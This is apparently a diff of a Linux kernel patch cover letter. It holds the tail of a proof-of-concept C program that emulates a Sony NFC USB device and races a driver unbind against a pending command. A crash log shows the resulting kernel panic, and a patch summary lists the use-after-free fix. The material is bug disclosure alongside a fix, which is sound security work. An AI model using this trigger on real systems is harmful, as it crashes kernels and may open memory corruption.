+	for (i = 0; i < baseline_n; i++) {
+		if (baseline[i] > baseline_max)
+			baseline_max = baseline[i];
+	}
+	fprintf(stderr, "baseline nfc max idx=%d\n", baseline_max);
+
+	if (setup_raw_gadget(&ctx) < 0) {
+		perror("setup_raw_gadget");
+		return 1;
+	}
+
+	if (wait_until_configured(&ctx, 15) < 0) {
+		perror("wait_until_configured");
+		return 1;
+	}
+
+	if (pthread_create(&bulk_thr, NULL, bulk_thread_fn, &ctx) != 0) {
+		perror("pthread_create");
+		return 1;
+	}
+
+	port100_idx = wait_new_nfc_index(baseline_max, 15);
+	if (port100_idx < 0) {
+		fprintf(stderr, "failed to find new nfc device index\n");
+		goto out;
+	}
+	fprintf(stderr, "port100 nfc index = %d\n", port100_idx);
+
+	nlfd = nl_sock_open(&nlseq);
+	if (nlfd < 0) {
+		perror("nl_sock_open");
+		goto out;
+	}
+
+	fam_id = genl_get_family_id(nlfd, &nlseq, NFC_GENL_NAME);
+	if (fam_id < 0) {
+		perror("genl_get_family_id");
+		goto out;
+	}
+	fprintf(stderr, "nfc genl family id = %d\n", fam_id);
+
+	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id, NFC_CMD_DEV_UP,
+				      port100_idx, false, 0, 60, 100) < 0)
+		perror("NFC_CMD_DEV_UP");
+	else
+		fprintf(stderr, "NFC_CMD_DEV_UP ok\n");
+
+	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id,
+				      NFC_CMD_START_POLL, port100_idx,
+				      true, NFC_PROTO_JEWEL_MASK, 60, 100) < 0)
+		perror("NFC_CMD_START_POLL");
+	else
+		fprintf(stderr, "NFC_CMD_START_POLL ok\n");
+
+	pthread_mutex_lock(&ctx.lock);
+	if (!ctx.saw_in_comm_rf) {
+		struct timespec ts;
+		clock_gettime(CLOCK_REALTIME, &ts);
+		ts.tv_sec += 10;
+		pthread_cond_timedwait(&ctx.cond, &ctx.lock, &ts);
+	}
+	pthread_mutex_unlock(&ctx.lock);
+
+	if (!ctx.saw_in_comm_rf) {
+		fprintf(stderr, "did not observe IN_COMM_RF command\n");
+		goto out;
+	}
+
+	fprintf(stderr, "trigger point reached, unbinding port100\n");
+
+	for (i = 0; i < 2 && i < (int)ARRAY_SIZE(hogs); i++) {
+		hogs[i].run = true;
+		hogs[i].cpu = i;
+		if (pthread_create(&hog_thr[i], NULL, hog_thread_fn, &hogs[i]) == 0)
+			hog_count++;
+	}
+
+	set_thread_realtime(95);
+
+	if (unbind_port100() < 0)
+		perror("unbind_port100");
+	else
+		fprintf(stderr, "unbind requested\n");
+
+	/* give kernel some time to run disconnect path */
+	sleep(2);
+
+out:
+	for (i = 0; i < hog_count; i++)
+		hogs[i].run = false;
+	for (i = 0; i < hog_count; i++)
+		pthread_join(hog_thr[i], NULL);
+
+	ctx.running = false;
+	if (ctx.fd >= 0)
+		close(ctx.fd);
+	if (nlfd >= 0)
+		close(nlfd);
+	pthread_cancel(bulk_thr);
+	pthread_join(bulk_thr, NULL);
+	fprintf(stderr, "done\n");
+	return 0;
+}
+
 ------END poc.c--------
 
 ----BEGIN crash log----
+[  146.906029][    T8] usb 3-1: new high-speed USB device number 2 using dummy_hcd
+[  147.096700][    T8] usb 3-1: New USB device found, idVendor=054c, idProduct=06c1, bcdDevice= 0.01
+[  147.128607][    T8] port100 3-1:1.0: NFC: Sony NFC Port-100 Series attached (firmware v1.01)
+[  147.257864][    C1] port100 3-1:1.0: NFC: Urb failure (status -108)
+[  147.264911][ T9678] port100 3-1:1.0: NFC: A command is still in process
+[  147.266168][ T9678] port100 3-1:1.0: NFC: Sony Port-100 NFC device disconnected
+[  147.267189][ T9678] ------------[ cut here ]------------
+[  147.267880][ T9678] ODEBUG: free active (active state 0) object: ffff88801fdc50e8 object type: work_struct hint: port100_wq_cmd_complete+0x0/0x330
+[  147.270533][ T9678] WARNING: CPU: 1 PID: 9678 at lib/debugobjects.c:515 debug_print_object+0x19e/0x2a0
+[  147.272216][ T9678] CPU: 1 PID: 9678 Comm: poc Not tainted 6.6.113-gae5e8e39e063 #2
+[  147.295908][ T9678]  device_unbind_cleanup+0x19/0x1b0
+[  147.296551][ T9678]  device_release_driver_internal+0x4bf/0x610
+[  147.297317][ T9678]  unbind_store+0xf2/0x110
+[  147.317382][ T9678] Kernel panic - not syncing: kernel: panic_on_warn set ...
+[  147.372780][ T9678] Rebooting in 86400 seconds..
 
-[  155.863220][  T949] =====================================
-[  155.865809][  T949] WARNING: bad unlock balance detected!
-[  155.873547][  T949] kworker/1:2/949 is trying to release lock (sk_lock-AF_NFC) at:
-[  155.877145][  T949] [<ffffffff8a4e5a2e>] nfc_llcp_rx_skb+0x1e2e/0x3ed0
-[  155.880682][  T949] but there are no more locks to release!
-[  156.042524][ T5144] ==================================================================
-[  156.046320][ T5144] BUG: KASAN: slab-use-after-free in nfc_llcp_sock_get+0x233/0x260
-[  156.050014][ T5144] Read of size 1 at addr ffff88802de1bd80 by task kworker/1:4/5144
-[  156.066148][ T5144] Call Trace:
-[  156.083921][ T5144]  nfc_llcp_sock_get+0x233/0x260
-[  156.085820][ T5144]  nfc_llcp_rx_skb+0x1d53/0x3ed0
-[  156.099618][ T5144]  nfc_llcp_rx_work+0xf3/0x230
-[  156.101041][ T5144]  process_one_work+0x981/0x1930
-[  156.106598][ T5144]  worker_thread+0x729/0x10e0
-[  156.111722][ T5144]  ret_from_fork+0x4b/0x80
-[  156.118725][ T5144] Allocated by task 949:
-[  156.128510][ T5144]  nfc_llcp_sock_alloc+0x37/0x600
-[  156.129846][ T5144]  nfc_llcp_rx_skb+0x214e/0x3ed0
-[  156.137938][ T5144] Freed by task 5144:
-[  156.146930][ T5144]  __sk_destruct+0x61e/0x750
-[  156.151513][ T5144]  nfc_llcp_rx_skb+0x2c66/0x3ed0
-[  156.260498][ T5144] ==================================================================
-[  156.262693][ T5144] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  156.270979][ T5144] Call Trace:
-[  156.283591][ T5144]  check_panic_on_warn+0xac/0xb0
-[  156.285952][ T5144]  kasan_report+0xf2/0x110
-[  156.288680][ T5144]  nfc_llcp_sock_get+0x233/0x260
-[  156.290008][ T5144]  nfc_llcp_rx_skb+0x1d53/0x3ed0
-[  156.302196][ T5144]  process_one_work+0x981/0x1930
-[  156.313945][ T5144]  ret_from_fork+0x4b/0x80
-[  156.317915][ T5144]  </TASK>
-[  156.318995][ T5144] Kernel Offset: disabled
-[  156.320156][ T5144] Rebooting in 86400 seconds..
 -----END crash log-----
 
 Best regards,
 Yuqi Xu
 
+Yuqi Xu (1):
+  nfc: digital: fix use-after-free in unregister
+
+ drivers/nfc/nfcsim.c      |  8 +++++++-
+ drivers/nfc/port100.c     |  7 +++++++
+ drivers/nfc/st95hf/core.c | 13 ++++++++++---
+ drivers/nfc/trf7970a.c    |  5 +++++
+ net/nfc/digital_core.c    | 22 +++++++++++++++++++++-
+ 5 files changed, 50 insertions(+), 5 deletions(-)
+
 -- 
 2.55.0
+
